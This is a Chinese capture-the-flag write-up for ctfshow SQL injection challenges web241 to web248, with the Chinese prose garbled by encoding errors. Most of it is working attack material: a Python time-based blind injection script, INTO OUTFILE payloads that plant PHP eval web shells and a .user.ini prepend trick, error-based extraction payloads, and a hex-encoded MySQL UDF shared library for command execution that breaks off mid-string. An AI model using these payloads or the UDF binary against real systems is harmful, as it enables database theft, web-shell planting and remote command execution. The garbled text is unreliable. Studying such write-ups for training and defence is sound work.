title="web241"></a>web241</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;delete from ctfshow_user where id &#x3D; &#123;$id&#125;&quot;;</code></pre><p>deleteå‡½æ•°åœ¨è¿›è¡Œåˆ¤æ–­åä¼šå›æ˜¾åˆ é™¤æˆåŠŸã€æˆ–åˆ é™¤å¤±è´¥,æ‰€ä»¥å°±ä¸èƒ½ç»™äºˆå›æ˜¾å†…å®¹æ¥çˆ†ç ´æ•°æ®ã€æ‰€ä»¥è¿™é‡Œç”¨æ—¶é—´ç›²æ³¨</p><pre class="language-sql" data-language="sql"><code class="language-sql">#@Authï¼šSentimentimport requestsurl&#x3D;&#39;http:&#x2F;&#x2F;80bc5222-eeb8-4d94-a68a-57d494f5809e.challenge.ctf.show&#x2F;api&#x2F;delete.php&#39;flag&#x3D;&#39;&#39;for i in range(1,50):    m&#x3D;32    n&#x3D;127    while 1:        mid&#x3D;(m+n)&#x2F;&#x2F;2        data&#x3D;&#123;        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),1)#&quot;.format(i,mid) # banlist,ctfshow_user,flag        #&#39;id&#39;:&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #id,flag,info        &#39;id&#39;:&quot;if(ascii(substr((select flag from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.05),0)&quot;.format(i,mid) #ctfshow&#123;24de54e5-a424-4e33-b6ff-00da4a72c909&#125;    &#125;        &#125;        print(data)        try:           r &#x3D; requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;1)           m&#x3D;mid        except:            n&#x3D;mid        if(m+1&#x3D;&#x3D;n):            flag+&#x3D;chr(m)            print(flag)            break</code></pre><h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sqlè¯­å¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#x2F;&#x2F;å¤‡ä»½è¡¨$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">SELECT ... INTO OUTFILE &#39;file_name&#39;        [CHARACTER SET charset_name]        [export_options]export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;åˆ†éš”ç¬¦        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]        [ESCAPED BY &#39;char&#39;]    ]    [LINES        [STARTING BY &#39;string&#39;]        [TERMINATED BY &#39;string&#39;]    ]----------------------------------------------------â€œOPTIONâ€å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼šFIELDS TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚FIELDS ENCLOSED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚FIELDS OPTIONALLY ENCLOSED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚FIELDS ESCAPED BY &#39;å­—ç¬¦&#39;ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚LINES STARTING BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚LINES TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚</code></pre><p>FIELDS TERMINATED BYã€ LINES STARTING BYã€ LINES TERMINATED BYå†™é©¬</p><pre class="language-none"><code class="language-none">åœ¨api&#x2F;dump.phpä¼ POSTfilename&#x3D;ma.php&#39; LINES STARTING BY &#39;&lt;?php eval($_GET[1]);?&gt;&#39;#ç„¶åè®¿é—®url&#x2F;dump&#x2F;ma.phpurl&#x2F;dump&#x2F;ma.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230830784.png" alt="image-20220511230830784"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511230845780.png" alt="image-20220511230845780"></p><h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¤‡ä»½è¡¨$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;è¿‡æ»¤äº†php</code></pre><p>å¯ä»¥åˆ©ç”¨.user.ini</p><p>å…ˆä¼ </p><pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;.user.ini&#39; lines starting by &#39;;&#39; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#ä¸ºä¿è¯auto_prepend_file&#x3D;1.jpgåœ¨å•ç‹¬ä¸€è¡Œï¼Œæ‰€ä»¥åœ¨å¼€å¤´ç»“å°¾éƒ½åŠ ä¸Šäº†0x0aæ¥æ¢è¡Œ</code></pre><p>å†ä¼ 1.jpgå°±è¡Œäº†</p><p>å› ä¸ºè¿‡æ»¤äº†phpï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾æˆ–è€…åå…­è¿›åˆ¶ç»•è¿‡ï¼š</p><pre class="language-txt" data-language="txt"><code class="language-txt">filename&#x3D;1.jpg&#39; LINES STARTING BY &#39;&lt;?&#x3D;eval($_GET[1]);?&gt;&#39;#</code></pre><p>ç„¶åè®¿é—®</p><pre class="language-payload" data-language="payload"><code class="language-payload">&#x2F;dump&#x2F;index.php?1&#x3D;system(&#39;cat &#x2F;flag.here&#39;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511231353361.png" alt="image-20220511231353361"></p><h2 id="web244ã€245"><a href="#web244ã€245" class="headerlink" title="web244ã€245"></a>web244ã€245</h2><p>æŠ¥é”™æ³¨å…¥</p><p>updatexml()å’Œextractvalue()åº”è¯¥éƒ½å¯ä»¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">web244&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flag&#39;),0x7e))--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,30),0x7e))+--+&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),20,30),0x7e))+--+web245åŒç†</code></pre><h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤è¿‡æ»¤updatexml extractvalue    </code></pre><p>æŠ¥é”™æ³¨å…¥</p><p>è¿‡æ»¤updatexml extractvalueäº†ä¹‹åï¼Œè¿˜æœ‰è¿™äº›å¯ç”¨</p><pre class="language-sql" data-language="sql"><code class="language-sql">1.floor()ã€round()ã€ceil()2.exp() &#x2F;&#x2F;5.5.5ç‰ˆæœ¬ä¹‹åå¯ä»¥ä½¿ç”¨3.name_const 4.geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() å‡ ä½•å‡½æ•°æŠ¥é”™</code></pre><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; Union select 1,count(*),concat((database()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</code></pre><p>ç„¶åå°±æ˜¯æ­£å¸¸çš„æŸ¥åˆ—æŸ¥å­—æ®µçš„æ“ä½œäº†</p><p>è¿˜å¯ä»¥ç”¨è¿™ç§</p><pre class="language-none"><code class="language-none">1&#39; or 1 group by concat_ws(0x7e,(select flag2 from ctfshow_flags),floor(rand(0)*2)) having min(0) or 1 --+</code></pre><h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤è¿‡æ»¤updatexml extractvalue floor    </code></pre><p>floorä¹Ÿè¿‡æ»¤äº†</p><pre class="language-none"><code class="language-none">round()&#96;å’Œ&#96;ceil()&#96;å¯ä»¥ä»£æ›¿&#96;floor()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175811180.png" alt="image-20220512175811180"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512175845954.png" alt="image-20220512175845954"></p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39; union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b --+-1&#39; Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39; limit 1,1),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--</code></pre><p>åè¾¹æ­£å¸¸æŸ¥å°±è¡Œï¼Œè¦æ³¨æ„çš„å°±æ˜¯åˆ«å¿˜äº†åŠ limitï¼Œè¿˜æœ‰å°±æ˜¯å­—æ®µåflagå˜æˆäº†flag?ï¼Œè¡¨åå’Œå­—æ®µåéƒ½å¯ä»¥ç”¨åå¼•å·å¼•èµ·æ¥ï¼Œè¿™æ˜¯ç”¨æ¥åŒºåˆ†MYSQLçš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦ã€‚æ‰€ä»¥æœ€ç»ˆçš„payloadä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">http:&#x2F;&#x2F;73673ded-1809-4e00-a9cf-eb2535a42fa6.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;-1&#39; Union select 1,count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),0x26,ceil(rand(0)*2))x from information_schema.columns group by x;--+</code></pre><h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤,</code></pre><p>é¢˜ç›®æç¤ºæ˜¯udfæ³¨å…¥</p><p>åŸç†å¤§è‡´å°±æ˜¯mysqlå¯ä»¥æŠŠdllæ–‡ä»¶å†™åˆ°ç›®æ ‡æœºå­çš„pluginç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯å¯ä»¥é€šè¿‡<code>select @@plugin_dir</code>æ¥å¾—åˆ°çš„ã€‚</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -æŸ¥å‡ºMysqlæ’ä»¶è·¯å¾„ï¼š&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+å¼•å…¥udf.soæ–‡ä»¶ä»è€Œåˆ›å»ºå‡½æ•°sys_eval</code></pre><p>å¤§å¸ˆå‚…çš„è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsbase_url&#x3D;&quot;http:&#x2F;&#x2F;994eba84-9ea5-4701-b204-01320382100c.challenge.ctf.show&#x2F;api&#x2F;&quot;payload &#x3D; []text &#x3D; [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;]udf &#x3D; &quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007